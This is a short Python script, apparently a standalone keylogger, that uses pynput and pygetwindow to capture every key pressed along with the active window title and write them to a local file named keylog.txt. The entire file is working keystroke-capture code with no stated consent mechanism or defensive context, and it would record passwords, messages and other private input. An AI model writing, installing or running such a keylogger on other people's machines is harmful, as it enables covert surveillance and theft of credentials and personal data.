from pynput import keyboard
import pygetwindow as gw
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Get the active window title
def get_active_window_title():
    try:
        active_window = gw.getActiveWindow()  # Get the active window
        if active_window is not None:
            return active_window.title
        return "Unknown Window"
    except Exception as e:
        return f"Error getting window title: {e}"

# Function called on key press
def on_press(key):
    window_title = get_active_window_title()
    try:
        key_log = f"{key.char} pressed in {window_title}"
    except AttributeError:
        key_log = f"Special key {key} pressed in {window_title}"
    
    logging.info(key_log)  # Log to file

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
